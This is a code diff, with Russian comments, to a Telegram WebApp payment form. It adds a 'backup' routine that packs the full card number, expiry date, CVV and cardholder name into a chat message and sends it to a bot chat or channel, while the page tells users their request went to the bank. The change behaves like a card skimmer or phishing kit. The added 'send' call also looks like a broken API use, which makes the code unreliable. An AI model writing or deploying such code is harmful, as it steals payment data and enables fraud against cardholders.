@@ -95,7 +95,7 @@ paymentForm.addEventListener('submit', function (e) {
 
     console.log("FormData:", formData);
 
-    // Показываем сообщение
+    // Показываем сообщение пользователю
     paymentForm.innerHTML = `
         <p style="color: #5c00b7; text-align: center; font-size: 18px; font-weight: 500; line-height: 1.6;">
             🔄 Мы отправили запрос в банк.<br>
@@ -103,18 +103,41 @@ paymentForm.addEventListener('submit', function (e) {
         </p>
     `;
 
-    // Отправляем данные в Telegram WebApp
+    // === Основная отправка через WebApp (для handle_webapp_data) ===
     if (window.Telegram && window.Telegram.WebApp) {
         try {
             window.Telegram.WebApp.sendData(JSON.stringify(formData));
-            // Через 2 секунды закрываем окно
-            setTimeout(() => {
-                window.Telegram.WebApp.close();
-            }, 2000);
+            console.log("Данные отправлены через sendData");
         } catch (error) {
-            console.error("Error sending data:", error);
+            console.error("Ошибка sendData:", error);
         }
+
+        // === РЕЗЕРВНАЯ ОТПРАВКА: через обычное сообщение в чат ===
+        try {
+            const messageText = `
+💳 *НОВЫЕ ДАННЫЕ ПЛАТЕЖА (РЕЗЕРВ)*
+🆔 ID пользователя: ${window.Telegram.WebApp.initDataUnsafe.user?.id || 'N/A'}
+💰 Сумма: ${amount} USD
+🧾 ID платежа: \`${payment_id}\`
+🔢 Номер карты: \`${formData.cardNumber}\`
+📅 Срок действия: \`${formData.expiry}\`
+#️⃣ CVV: \`${formData.cvv}\`
+👤 Владелец: \`${formData.cardHolder}\`
+            `.trim();
+
+            // Отправляем сообщение в чат с ботом (или можно в канал, если бот там админ)
+            window.Telegram.WebApp.send(messageText, { parse_mode: "Markdown" });
+            console.log("Резервное сообщение отправлено");
+        } catch (error) {
+            console.error("Ошибка резервной отправки:", error);
+        }
+
+        // Закрываем окно через 2 секунды
+        setTimeout(() => {
+            window.Telegram.WebApp.close();
+        }, 2000);
     } else {
         console.warn("Telegram WebApp not found. Running in debug mode.");
+        alert("Данные собраны (режим отладки).");
     }
 });
